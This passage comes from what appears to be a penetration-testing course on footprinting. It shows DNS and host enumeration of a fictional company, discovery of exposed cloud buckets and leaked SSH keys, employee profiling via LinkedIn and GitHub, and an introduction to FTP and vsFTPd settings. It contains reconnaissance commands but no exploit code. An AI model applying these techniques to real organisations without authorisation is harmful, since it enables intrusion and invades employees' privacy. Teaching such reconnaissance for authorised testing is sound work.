<span class="hljs-string">Updated:</span>                 <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-01</span><span class="hljs-string">T09:</span><span class="hljs-number">02</span>:<span class="hljs-number">11.370085</span>
Number of open <span class="hljs-string">ports:</span>    <span class="hljs-number">2</span>
<span class="hljs-symbol">
Ports:</span>
     <span class="hljs-number">80</span>/tcp nginx 
    <span class="hljs-number">443</span>/tcp nginx 

<span class="hljs-number">10.129</span><span class="hljs-number">.27</span><span class="hljs-number">.33</span>
<span class="hljs-string">City:</span>                    Berlin
<span class="hljs-string">Country:</span>                 Germany
<span class="hljs-string">Organization:</span>            InlaneFreight
<span class="hljs-string">Updated:</span>                 <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-30</span><span class="hljs-string">T22:</span><span class="hljs-number">25</span>:<span class="hljs-number">31.572717</span>
Number of open <span class="hljs-string">ports:</span>    <span class="hljs-number">3</span>
<span class="hljs-symbol">
Ports:</span>
     <span class="hljs-number">22</span>/tcp OpenSSH (<span class="hljs-number">7.6</span>p1 Ubuntu<span class="hljs-number">-4</span>ubuntu0<span class="hljs-number">.3</span>)
     <span class="hljs-number">80</span>/tcp nginx 
    <span class="hljs-number">443</span>/tcp nginx 
        |-- SSL <span class="hljs-string">Versions:</span> -SSLv2, -SSLv3, -TLSv1, -TLSv1<span class="hljs-number">.1</span>, -TLSv1<span class="hljs-number">.3</span>, TLSv1<span class="hljs-number">.2</span>
        |-- Diffie-Hellman <span class="hljs-string">Parameters:</span>
<span class="hljs-symbol">                Bits:</span>          <span class="hljs-number">2048</span>
<span class="hljs-symbol">                Generator:</span>     <span class="hljs-number">2</span>

<span class="hljs-number">10.129</span><span class="hljs-number">.27</span><span class="hljs-number">.22</span>
<span class="hljs-string">City:</span>                    Berlin
<span class="hljs-string">Country:</span>                 Germany
<span class="hljs-string">Organization:</span>            InlaneFreight
<span class="hljs-string">Updated:</span>                 <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-01</span><span class="hljs-string">T15:</span><span class="hljs-number">39</span>:<span class="hljs-number">55.446281</span>
Number of open <span class="hljs-string">ports:</span>    <span class="hljs-number">8</span>
<span class="hljs-symbol">
Ports:</span>
     <span class="hljs-number">25</span>/tcp  
        |-- SSL <span class="hljs-string">Versions:</span> -SSLv2, -SSLv3, -TLSv1, -TLSv1<span class="hljs-number">.1</span>, TLSv1<span class="hljs-number">.2</span>, TLSv1<span class="hljs-number">.3</span>
     <span class="hljs-number">53</span>/tcp  
     <span class="hljs-number">53</span>/udp  
     <span class="hljs-number">80</span>/tcp Apache httpd 
     <span class="hljs-number">81</span>/tcp Apache httpd 
    <span class="hljs-number">110</span>/tcp  
        |-- SSL <span class="hljs-string">Versions:</span> -SSLv2, -SSLv3, -TLSv1, -TLSv1<span class="hljs-number">.1</span>, TLSv1<span class="hljs-number">.2</span>
    <span class="hljs-number">111</span>/tcp  
    <span class="hljs-number">443</span>/tcp Apache httpd 
        |-- SSL <span class="hljs-string">Versions:</span> -SSLv2, -SSLv3, -TLSv1, -TLSv1<span class="hljs-number">.1</span>, TLSv1<span class="hljs-number">.2</span>, TLSv1<span class="hljs-number">.3</span>
        |-- Diffie-Hellman <span class="hljs-string">Parameters:</span>
<span class="hljs-symbol">                Bits:</span>          <span class="hljs-number">2048</span>
<span class="hljs-symbol">                Generator:</span>     <span class="hljs-number">2</span>
<span class="hljs-symbol">                Fingerprint:</span>   RFC3526/Oakley Group <span class="hljs-number">14</span>
    <span class="hljs-number">444</span>/tcp  

<span class="hljs-number">10.129</span><span class="hljs-number">.27</span><span class="hljs-number">.33</span>
<span class="hljs-string">City:</span>                    Berlin
<span class="hljs-string">Country:</span>                 Germany
<span class="hljs-string">Organization:</span>            InlaneFreight
<span class="hljs-string">Updated:</span>                 <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-30</span><span class="hljs-string">T22:</span><span class="hljs-number">25</span>:<span class="hljs-number">31.572717</span>
Number of open <span class="hljs-string">ports:</span>    <span class="hljs-number">3</span>
<span class="hljs-symbol">
Ports:</span>
     <span class="hljs-number">22</span>/tcp OpenSSH (<span class="hljs-number">7.6</span>p1 Ubuntu<span class="hljs-number">-4</span>ubuntu0<span class="hljs-number">.3</span>)
     <span class="hljs-number">80</span>/tcp nginx 
    <span class="hljs-number">443</span>/tcp nginx 
        |-- SSL <span class="hljs-string">Versions:</span> -SSLv2, -SSLv3, -TLSv1, -TLSv1<span class="hljs-number">.1</span>, -TLSv1<span class="hljs-number">.3</span>, TLSv1<span class="hljs-number">.2</span>
        |-- Diffie-Hellman <span class="hljs-string">Parameters:</span>
<span class="hljs-symbol">                Bits:</span>          <span class="hljs-number">2048</span>
<span class="hljs-symbol">                Generator:</span>     <span class="hljs-number">2</span>
</code></pre>
<p>We remember the IP <code>10.129.127.22</code> (<code>matomo.inlanefreight.com</code>) for later active investigations we want to perform. Now, we can display all the available DNS records where we might find more hosts.</p>
<p><strong>DNS Records</strong></p>
<p>Domain Information</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ dig any inlanefreight.com

<span class="hljs-comment">; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; any inlanefreight.com</span>
<span class="hljs-comment">;; global options: +cmd</span>
<span class="hljs-comment">;; Got answer:</span>
<span class="hljs-comment">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 52058</span>
<span class="hljs-comment">;; flags: qr rd ra; QUERY: 1, ANSWER: 17, AUTHORITY: 0, ADDITIONAL: 1</span>

<span class="hljs-comment">;; OPT PSEUDOSECTION:</span>
<span class="hljs-comment">; EDNS: version: 0, flags:; udp: 65494</span>
<span class="hljs-comment">;; QUESTION SECTION:</span>
<span class="hljs-comment">;inlanefreight.com.             IN      ANY</span>

<span class="hljs-comment">;; ANSWER SECTION:</span>
inlanefreight.com.      <span class="hljs-number">300</span>     <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>       <span class="hljs-number">10.129.27.33</span>
inlanefreight.com.      <span class="hljs-number">300</span>     <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>       <span class="hljs-number">10.129.95.250</span>
inlanefreight.com.      <span class="hljs-number">3600</span>    <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">MX</span>      <span class="hljs-number">1</span> aspmx.l.google.com.
inlanefreight.com.      <span class="hljs-number">3600</span>    <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">MX</span>      <span class="hljs-number">10</span> aspmx2.googlemail.com.
inlanefreight.com.      <span class="hljs-number">3600</span>    <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">MX</span>      <span class="hljs-number">10</span> aspmx3.googlemail.com.
inlanefreight.com.      <span class="hljs-number">3600</span>    <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">MX</span>      <span class="hljs-number">5</span> alt1.aspmx.l.google.com.
inlanefreight.com.      <span class="hljs-number">3600</span>    <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">MX</span>      <span class="hljs-number">5</span> alt2.aspmx.l.google.com.
inlanefreight.com.      <span class="hljs-number">21600</span>   <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">NS</span>      ns.inwx.net.
inlanefreight.com.      <span class="hljs-number">21600</span>   <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">NS</span>      ns2.inwx.net.
inlanefreight.com.      <span class="hljs-number">21600</span>   <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">NS</span>      ns3.inwx.eu.
inlanefreight.com.      <span class="hljs-number">3600</span>    <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">TXT</span>     "MS=ms<span class="hljs-number">92346782372</span>"
inlanefreight.com.      <span class="hljs-number">21600</span>   <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">TXT</span>     "atlassian-domain-verification=IJdXMt1rKCy68JFszSdCKVpwPN"
inlanefreight.com.      <span class="hljs-number">3600</span>    <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">TXT</span>     "google-site-verification=O7zV5-xFh_jn7JQ31"
inlanefreight.com.      <span class="hljs-number">300</span>     <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">TXT</span>     "google-site-verification=bow47-er9LdgoUeah"
inlanefreight.com.      <span class="hljs-number">3600</span>    <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">TXT</span>     "google-site-verification=gZsCG-BINLopf4hr2"
inlanefreight.com.      <span class="hljs-number">3600</span>    <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">TXT</span>     "logmein-verification-code=<span class="hljs-number">87123</span>gff5a479e-<span class="hljs-number">61d</span>4325gddkbvc1-b2bnfghfsed1-<span class="hljs-number">3</span>c789427sdjirew63fc"
inlanefreight.com.      <span class="hljs-number">300</span>     <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">TXT</span>     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip<span class="hljs-number">4:10.129.24</span>.<span class="hljs-number">8</span> ip<span class="hljs-number">4:10.129.27</span>.<span class="hljs-number">2</span> ip<span class="hljs-number">4:10.72.82</span>.<span class="hljs-number">106</span> ~all"
inlanefreight.com.      <span class="hljs-number">21600</span>   <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">SOA</span>     ns.inwx.net. hostmaster.inwx.net. <span class="hljs-number">2021072600</span> <span class="hljs-number">10800 3600</span> <span class="hljs-number">604800</span> <span class="hljs-number">3600</span>

<span class="hljs-comment">;; Query time: 332 msec</span>
<span class="hljs-comment">;; SERVER: 127.0.0.53#53(127.0.0.53)</span>
<span class="hljs-comment">;; WHEN: Mi Sep 01 18:27:22 CEST 2021</span>
<span class="hljs-comment">;; MSG SIZE  rcvd: 940</span>
</code></pre>
<p>Let us look at what we have learned here and come back to our principles. We see an IP record, some mail servers, some DNS servers, TXT records, and an SOA record.</p>
<ul>
<li><code>A</code> records: We recognize the IP addresses that point to a specific (sub)domain through the A record. Here we only see one that we already know.</li>
<li><code>MX</code> records: The mail server records show us which mail server is responsible for managing the emails for the company. Since this is handled by google in our case, we should note this and skip it for now.</li>
<li><code>NS</code> records: These kinds of records show which name servers are used to resolve the FQDN to IP addresses. Most hosting providers use their own name servers, making it easier to identify the hosting provider.</li>
<li><code>TXT</code> records: this type of record often contains verification keys for different third-party providers and other security aspects of DNS, such as <a href="https://datatracker.ietf.org/doc/html/rfc7208">SPF</a>, <a href="https://datatracker.ietf.org/doc/html/rfc7489">DMARC</a>, and <a href="https://datatracker.ietf.org/doc/html/rfc6376">DKIM</a>, which are responsible for verifying and confirming the origin of the emails sent. Here we can already see some valuable information if we look closer at the results.</li>
</ul>
<p>Domain Information</p>
<pre><code class="lang-shell-session">...SNIP... TXT     <span class="hljs-string">"MS=ms92346782372"</span>
...SNIP... TXT     <span class="hljs-string">"atlassian-domain-verification=IJdXMt1rKCy68JFszSdCKVpwPN"</span>
...SNIP... TXT     <span class="hljs-string">"google-site-verification=O7zV5-xFh_jn7JQ31"</span>
...SNIP... TXT     <span class="hljs-string">"google-site-verification=bow47-er9LdgoUeah"</span>
...SNIP... TXT     <span class="hljs-string">"google-site-verification=gZsCG-BINLopf4hr2"</span>
...SNIP... TXT     <span class="hljs-string">"logmein-verification-code=87123gff5a479e-61d4325gddkbvc1-b2bnfghfsed1-3c789427sdjirew63fc"</span>
...SNIP... TXT     <span class="hljs-string">"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.24.8 ip4:10.129.27.2 ip4:10.72.82.106 ~all"</span>
</code></pre>
<p>What we could see so far were entries on the DNS server, which at first glance did not look very interesting (except for the additional IP addresses). However, we could not see the third-party providers behind the entries shown at first glance. The core information we can see now is:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://www.atlassian.com/">Atlassian</a></td>
<td><a href="https://www.google.com/gmail/">Google Gmail</a></td>
<td><a href="https://www.logmein.com/">LogMeIn</a></td>
</tr>
<tr>
<td><a href="https://www.mailgun.com/">Mailgun</a></td>
<td><a href="https://outlook.live.com/owa/">Outlook</a></td>
<td><a href="https://www.inwx.com/en">INWX</a> ID/Username</td>
</tr>
<tr>
<td>10.129.24.8</td>
<td>10.129.27.2</td>
<td>10.72.82.106</td>
</tr>
</tbody>
</table>
<p>For example, <a href="https://www.atlassian.com/">Atlassian</a> states that the company uses this solution for software development and collaboration. If we are not familiar with this platform, we can try it for free to get acquainted with it.</p>
<p><a href="https://www.google.com/gmail/">Google Gmail</a> indicates that Google is used for email management. Therefore, it can also suggest that we could access open GDrive folders or files with a link.</p>
<p><a href="https://www.logmein.com/">LogMeIn</a> is a central place that regulates and manages remote access on many different levels. However, the centralization of such operations is a double-edged sword. If access as an administrator to this platform is obtained (e.g., through password reuse), one also has complete access to all systems and information.</p>
<p><a href="https://www.mailgun.com/">Mailgun</a> offers several email APIs, SMTP relays, and webhooks with which emails can be managed. This tells us to keep our eyes open for API interfaces that we can then test for various vulnerabilities such as IDOR, SSRF, POST, PUT requests, and many other attacks.</p>
<p><a href="https://outlook.live.com/owa/">Outlook</a> is another indicator for document management. Companies often use Office 365 with OneDrive and cloud resources such as Azure blob and file storage. Azure file storage can be very interesting because it works with the SMB protocol.</p>
<p>The last thing we see is <a href="https://www.inwx.com/en">INWX</a>. This company seems to be a hosting provider where domains can be purchased and registered. The TXT record with the &quot;MS&quot; value is often used to confirm the domain. In most cases, it is similar to the username or ID used to log in to the management platform.</p>
<h2 id="cloud-resources">Cloud Resources</h2>
<hr>
<p>The use of cloud, such as <a href="https://aws.amazon.com/">AWS</a>, <a href="https://cloud.google.com/">GCP</a>, <a href="https://azure.microsoft.com/en-us/">Azure</a>, and others, is now one of the essential components for many companies nowadays. After all, all companies want to be able to do their work from anywhere, so they need a central point for all management. This is why services from <code>Amazon</code> (<code>AWS</code>), <code>Google</code> (<code>GCP</code>), and <code>Microsoft</code> (<code>Azure</code>) are ideal for this purpose.</p>
<p>Even though cloud providers secure their infrastructure centrally, this does not mean that companies are free from vulnerabilities. The configurations made by the administrators may nevertheless make the company&#39;s cloud resources vulnerable. This often starts with the <code>S3 buckets</code> (AWS), <code>blobs</code> (Azure), <code>cloud storage</code> (GCP), which can be accessed without authentication if configured incorrectly.</p>
<p><strong>Company Hosted Servers</strong></p>
<p>Cloud Resources</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep <span class="hljs-string">"has address"</span> | grep inlanefreight.com | cut -d<span class="hljs-string">" "</span> -f1,<span class="hljs-number">4</span>;done

blog.inlanefreight.com <span class="hljs-number">10.129</span><span class="hljs-number">.24</span><span class="hljs-number">.93</span>
inlanefreight.com <span class="hljs-number">10.129</span><span class="hljs-number">.27</span><span class="hljs-number">.33</span>
matomo.inlanefreight.com <span class="hljs-number">10.129</span><span class="hljs-number">.127</span><span class="hljs-number">.22</span>
www.inlanefreight.com <span class="hljs-number">10.129</span><span class="hljs-number">.127</span><span class="hljs-number">.33</span>
s3-website-us-west<span class="hljs-number">-2.</span>amazonaws.com <span class="hljs-number">10.129</span><span class="hljs-number">.95</span><span class="hljs-number">.250</span>
</code></pre>
<p>Often cloud storage is added to the DNS list when used for administrative purposes by other employees. This step makes it much easier for the employees to reach and manage them. Let us stay with the case that a company has contracted us, and during the IP lookup, we have already seen that one IP address belongs to the <code>s3-website-us-west-2.amazonaws.com</code> server.</p>
<p>However, there are many different ways to find such cloud storage. One of the easiest and most used is Google search combined with Google Dorks. For example, we can use the Google Dorks <code>inurl:</code> and <code>intext:</code> to narrow our search to specific terms. In the following example, we see red censored areas containing the company name.</p>
<p><strong>Google Search for AWS</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/gsearch1.png" alt=""></p>
<p><strong>Google Search for Azure</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/gsearch2.png" alt=""></p>
<p>Here we can already see that the links presented by Google contain PDFs. When we search for a company that we may already know or want to know, we will also come across other files such as text documents, presentations, codes, and many others.</p>
<p>Such content is also often included in the source code of the web pages, from where the images, JavaScript codes, or CSS are loaded. This procedure often relieves the web server and does not store unnecessary content.</p>
<p><strong>Target Website - Source Code</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/cloud3.png" alt=""></p>
<p>Third-party providers such as <a href="https://domain.glass/">domain.glass</a> can also tell us a lot about the company&#39;s infrastructure. As a positive side effect, we can also see that Cloudflare&#39;s security assessment status has been classified as &quot;Safe&quot;. This means we have already found a security measure that can be noted for the second layer (gateway).</p>
<p><strong>Domain.Glass Results</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/cloud1.png" alt=""></p>
<p>Another very useful provider is <a href="https://buckets.grayhatwarfare.com/">GrayHatWarfare</a>. We can do many different searches, discover AWS, Azure, and GCP cloud storage, and even sort and filter by file format. Therefore, once we have found them through Google, we can also search for them on GrayHatWarefare and passively discover what files are stored on the given cloud storage.</p>
<p><strong>GrayHatWarfare Results</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/cloud2.png" alt=""></p>
<p>Many companies also use abbreviations of the company name, which are then used accordingly within the IT infrastructure. Such terms are also part of an excellent approach to discovering new cloud storage from the company. We can also search for files simultaneously to see the files that can be accessed at the same time.</p>
<p><strong>Private and Public SSH Keys Leaked</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/ghw1.png" alt=""></p>
<p>Sometimes when employees are overworked or under high pressure, mistakes can be fatal for the entire company. These errors can even lead to SSH private keys being leaked, which anyone can download and log onto one or even more machines in the company without using a password.</p>
<p><strong>SSH Private Key</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/ghw2.png" alt=""></p>
<h2 id="staff">Staff</h2>
<hr>
<p>Searching for and identifying employees on social media platforms can also reveal a lot about the teams&#39; infrastructure and makeup. This, in turn, can lead to us identifying which technologies, programming languages, and even software applications are being used. To a large extent, we will also be able to assess each person&#39;s focus based on their skills. The posts and material shared with others are also a great indicator of what the person is currently engaged in and what that person currently feels is important to share with others.</p>
<p>Employees can be identified on various business networks such as <a href="https://www.linkedin.com/">LinkedIn</a> or <a href="https://www.xing.de/">Xing</a>. Job postings from companies can also tell us a lot about their infrastructure and give us clues about what we should be looking for.</p>
<p><strong>LinkedIn - Job Post</strong></p>
<p>Code: txt</p>
<pre><code class="lang-txt">Required Skills/Knowledge/Experience:

* <span class="hljs-number">3</span><span class="hljs-number">-10</span>+ years <span class="hljs-keyword">of</span> experience <span class="hljs-keyword">on</span> professional software development projects.

 An active US Government TS/SCI Security Clearance (current SSBI) <span class="hljs-keyword">or</span> eligibility <span class="hljs-keyword">to</span> obtain TS/SCI within nine months.
 Bachelor's degree <span class="hljs-keyword">in</span> computer science/computer engineering <span class="hljs-keyword">with</span> an engineering/math focus <span class="hljs-keyword">or</span> another equivalent field <span class="hljs-keyword">of</span> discipline.
 Experience <span class="hljs-keyword">with</span> one <span class="hljs-keyword">or</span> more object-oriented languages (e.g., Java, C<span class="hljs-comment">#, C++).</span>
 Experience <span class="hljs-keyword">with</span> one <span class="hljs-keyword">or</span> more scripting languages (e.g., Python, Ruby, PHP, Perl).
 Experience using SQL databases (e.g., PostgreSQL, MySQL, SQL Server, Oracle).
 Experience using ORM frameworks (e.g., SQLAIchemy, Hibernate, Entity Framework).
 Experience using Web frameworks (e.g., Flask, Django, Spring, ASP.NET MVC).
 Proficient <span class="hljs-keyword">with</span> unit testing <span class="hljs-keyword">and</span> test frameworks (e.g., pytest, JUnit, NUnit, xUnit).
 Service-Oriented Architecture (SOA)/microservices &amp; RESTful API design/implementation.
 Familiar <span class="hljs-keyword">and</span> comfortable <span class="hljs-keyword">with</span> Agile Development Processes.
 Familiar <span class="hljs-keyword">and</span> comfortable <span class="hljs-keyword">with</span> Continuous Integration environments.
 Experience <span class="hljs-keyword">with</span> <span class="hljs-built_in">version</span> control systems (e.g., Git, SVN, Mercurial, Perforce).

Desired Skills/Knowledge/ Experience:

 CompTIA Security+ certification (<span class="hljs-keyword">or</span> equivalent).
 Experience <span class="hljs-keyword">with</span> Atlassian suite (Confluence, Jira, Bitbucket).
 Algorithm Development (e.g., Image Processing algorithms).
 Software security.
 Containerization <span class="hljs-keyword">and</span> container orchestration (Docker, Kubernetes, etc.)
 Redis.
 NumPy.
</code></pre>
<p>From a job post like this, we can see, for example, which programming languages are preferred: <code>Java, C#, C++, Python, Ruby, PHP, Perl</code>. It also required that the applicant be familiar with different databases, such as: <code>PostgreSQL, Mysql, and Oracle</code>. In addition, we know that different frameworks are used for web application development, such as: <code>Flask, Django, ASP.NET, Spring</code>.</p>
<p>Furthermore, we use <code>REST APIs, Github, SVN, and Perforce</code>. The job offer also results that the company works with Atlassian Suite, and therefore there may be resources that we could potentially access. We can see some skills and projects from the career history that give us a reasonable estimate of the employee&#39;s knowledge.</p>
<p><strong>LinkedIn - Employee #1 About</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/linkedin-pers2.png" alt=""></p>
<p>We try to make business contacts on social media sites and prove to visitors what skills we bring to the table, which inevitably leads to us sharing with the public what we know and what we have learned so far. Companies always hire employees whose skills they can use and apply to the business. For example, we know that Flask and Django are web frameworks for the Python programming language.</p>
<p>If we do a little search for Django security misconfigurations, we will eventually come across the following <a href="https://github.com/boomcamp/django-security">Github repository</a> that describes OWASP Top10 for Django. We can use this to understand the inner structure of Django and how it works. The best practices also often tell us what to look for. Because many blindly trust them and even name many of the files as shown in the instructions.</p>
<p><strong>Github</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/github.png" alt=""></p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/github2.png" alt=""></p>
<p>Showing our projects can, of course, be of great advantage to make new business contacts and possibly even get a new job, but on the other hand, it can lead to mistakes that will be very difficult to fix. For example, in one of the files, we can discover the employee&#39;s personal email address, and upon deeper investigation, the web application has a hardcoded <a href="https://jwt.io/">JWT token</a>.</p>
<p><strong>LinkedIn - Employee #2 Career</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/linkedin-pers1.png" alt=""></p>
<p><a href="https://www.linkedin.com/">LinkedIn</a> offers a comprehensive search for employed, sorted by connections, locations, companies, school, industry, profile language, services, names, titles, and more. Understandably, the more detailed information we provide there, the fewer results we get. Therefore, we should think carefully about the purpose of performing the search.</p>
<p>Suppose we are trying to find the infrastructure and technology the company is most likely to use. We should look for technical employees who work both in development and security. Because based on the security area and the employees who work in that area, we will also be able to determine what security measures the company has put in place to secure itself.</p>
<h2 id="ftp">FTP</h2>
<hr>
<p>The <code>File Transfer Protocol</code> (<code>FTP</code>) is one of the oldest protocols on the Internet. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as <code>HTTP</code> or <code>POP</code>. These protocols also work with the support of browsers or email clients to perform their services. There are also special FTP programs for the File Transfer Protocol.</p>
<p>Let us imagine that we want to upload local files to a server and download other files using the <a href="https://datatracker.ietf.org/doc/html/rfc959">FTP</a> protocol. In an FTP connection, two channels are opened. First, the client and server establish a control channel through <code>TCP port 21</code>. The client sends commands to the server, and the server returns status codes. Then both communication participants can establish the data channel via <code>TCP port 20</code>. This channel is used exclusively for data transmission, and the protocol watches for errors during this process. If a connection is broken off during transmission, the transport can be resumed after re-established contact.</p>
<p>A distinction is made between <code>active</code> and <code>passive</code> FTP. In the active variant, the client establishes the connection as described via TCP port 21 and thus informs the server via which client-side port the server can transmit its responses. However, if a firewall protects the client, the server cannot reply because all external connections are blocked. For this purpose, the <code>passive mode</code> has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the connection in this method, the firewall does not block the transfer.</p>
<p>The FTP knows different <a href="https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/">commands</a> and status codes. Not all of these commands are consistently implemented on the server. For example, the client-side instructs the server-side to upload or download files, organize directories or delete files. The server responds in each case with a status code that indicates whether the command was successfully implemented. A list of possible status codes can be found <a href="https://en.wikipedia.org/wiki/List\_of\_FTP\_server\_return\_codes">here</a>.</p>
<p>Usually, we need credentials to use FTP on a server. We also need to know that FTP is a <code>clear-text</code> protocol that can sometimes be sniffed if conditions on the network are right. However, there is also the possibility that a server offers <code>anonymous FTP</code>. The server operator then allows any user to upload or download files via FTP without using a password. Since there are security risks associated with such a public FTP server, the options for users are usually limited.</p>
<hr>
<h3 id="tftp">TFTP</h3>
<p><code>Trivial File Transfer Protocol</code> (<code>TFTP</code>) is simpler than FTP and performs file transfers between client and server processes. However, it <code>does not</code> provide user authentication and other valuable features supported by FTP. In addition, while FTP uses TCP, TFTP uses <code>UDP</code>, making it an unreliable protocol and causing it to use UDP-assisted application layer recovery.</p>
<p>This is reflected, for example, in the fact that TFTP, unlike FTP, does not require the user&#39;s authentication. It does not support protected login via passwords and sets limits on access based solely on the read and write permissions of a file in the operating system. Practically, this leads to TFTP operating exclusively in directories and with files that have been shared with all users and can be read and written globally. Because of the lack of security, TFTP, unlike FTP, may only be used in local and protected networks.</p>
<p>Let us take a look at a few commands of <code>TFTP</code>:</p>
<table>
<thead>
<tr>
<th><strong>Commands</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>connect</code></td>
<td>Sets the remote host, and optionally the port, for file transfers.</td>
</tr>
<tr>
<td><code>get</code></td>
<td>Transfers a file or set of files from the remote host to the local host.</td>
</tr>
<tr>
<td><code>put</code></td>
<td>Transfers a file or set of files from the local host onto the remote host.</td>
</tr>
<tr>
<td><code>quit</code></td>
<td>Exits tftp.</td>
</tr>
<tr>
<td><code>status</code></td>
<td>Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on.</td>
</tr>
<tr>
<td><code>verbose</code></td>
<td>Turns verbose mode, which displays additional information during file transfer, on or off.</td>
</tr>
</tbody>
</table>
<p>Unlike the FTP client, <code>TFTP</code> does not have directory listing functionality.</p>
<hr>
<h3 id="default-configuration">Default Configuration</h3>
<p>One of the most used FTP servers on Linux-based distributions is <a href="https://security.appspot.com/vsftpd.html">vsFTPd</a>. The default configuration of vsFTPd can be found in <code>/etc/vsftpd.conf</code>, and some settings are already predefined by default. It is highly recommended to install the vsFTPd server on a VM and have a closer look at this configuration.</p>
<p><strong>Install vsFTPd</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo apt install vsftpd
</code></pre>
<p>The vsFTPd server is only one of a few FTP servers available to us. There are many different alternatives to it, which also bring, among other things, many more functions and configuration options with them. We will use the vsFTPd server because it is an excellent way to show the configuration possibilities of an FTP server in a simple and easy-to-understand way without going into the details of the man pages. If we look at the configuration file of vsFTPd, we will see many options and settings that are either commented or commented out. However, the configuration file does not contain all possible settings that can be made. The existing and missing ones can be found on the <a href="http://vsftpd.beasts.org/vsftpd\_conf.html">man page</a>.</p>
<p><strong>vsFTPd Config File</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">cat</span> /etc/vsftpd.<span class="hljs-keyword">conf</span> | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">"#"</span>
</code></pre>
<table>
<thead>
<tr>
<th><strong>Setting</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>listen=NO</code></td>
<td>Run from inetd or as a standalone daemon?</td>
</tr>
<tr>
<td><code>listen_ipv6=YES</code></td>
<td>Listen on IPv6 ?</td>
</tr>
<tr>
<td><code>anonymous_enable=NO</code></td>
<td>Enable Anonymous access?</td>
</tr>
<tr>
<td><code>local_enable=YES</code></td>
<td>Allow local users to login?</td>
</tr>
<tr>
<td><code>dirmessage_enable=YES</code></td>
<td>Display active directory messages when users go into certain directories?</td>
</tr>
<tr>
<td><code>use_localtime=YES</code></td>
<td>Use local time?</td>
</tr>
<tr>
<td><code>xferlog_enable=YES</code></td>
<td>Activate logging of uploads/downloads?</td>
</tr>
<tr>
<td><code>connect_from_port_20=YES</code></td>
<td>Connect from port 20?</td>
</tr>
<tr>
<td><code>secure_chroot_dir=/var/run/vsftpd/empty</code></td>
<td>Name of an empty directory</td>
</tr>
<tr>
<td><code>pam_service_name=vsftpd</code></td>
<td>This string is the name of the PAM service vsftpd will use.</td>
</tr>
<tr>
<td><code>rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem</code></td>
<td>The last three options specify the location of the RSA certificate to use for SSL encrypted connections.</td>
</tr>
<tr>
<td><code>rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key</code></td>
<td></td>
</tr>
<tr>
<td><code>ssl_enable=NO</code></td>
</tr>
</tbody>
</table>
<p>In addition, there is a file called <code>/etc/ftpusers</code> that we also need to pay attention to, as this file is used to deny certain users access to the FTP service. In the following example, the users <code>guest</code>, <code>john</code>, and <code>kevin</code> are not permitted to log in to the FTP service, even if they exist on the Linux system.</p>
<p><strong>FTPUSERS</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ cat /etc/ftpusers

guest
john
kevin
</code></pre>
<hr>
<h3 id="dangerous-settings">Dangerous Settings</h3>
<p>There are many different security-related settings we can make on each FTP server. These can have various purposes, such as testing connections through the firewalls, testing routes, and authentication mechanisms. One of these authentication mechanisms is the <code>anonymous</code> user. This is often used to allow everyone on the internal network to share files and data without accessing each other&#39;s computers. With vsFTPd, the <a href="http://vsftpd.beasts.org/vsftpd\_conf.html">optional settings</a> that can be added to the configuration file for the anonymous login look like this:</p>
<table>
<thead>
<tr>
